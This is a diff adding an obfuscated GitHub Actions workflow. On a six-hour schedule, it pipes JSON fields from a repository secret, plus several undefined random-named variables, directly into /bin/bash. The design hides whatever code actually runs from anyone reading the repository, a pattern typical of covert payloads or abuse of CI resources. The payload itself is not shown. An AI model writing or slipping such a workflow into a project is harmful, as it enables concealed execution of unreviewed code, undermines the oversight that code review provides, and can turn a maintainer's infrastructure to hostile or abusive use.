@@ -1,0 +1,23 @@
+name: liuzhuanxxo
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '51 3/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: liuzhuanxxo
+        env:
+          pu79158: ${{ secrets.pu79158 }}
+        run: |
+          echo $pu79158 | jq -r .sbp9067 | /bin/bash
+          echo $fe466 | jq -r .eoxiu31 | /bin/bash
+          echo $is7 | jq -r .hv3 | /bin/bash
+          echo $sbmd7603 | jq -r .se7267 | /bin/bash
+          echo $emj75250 | jq -r .woie841 | /bin/bash
+          echo $sgqm92791 | jq -r .bpgcy2 | /bin/bash
+          echo $nab9001 | jq -r .a512 | /bin/bash
+
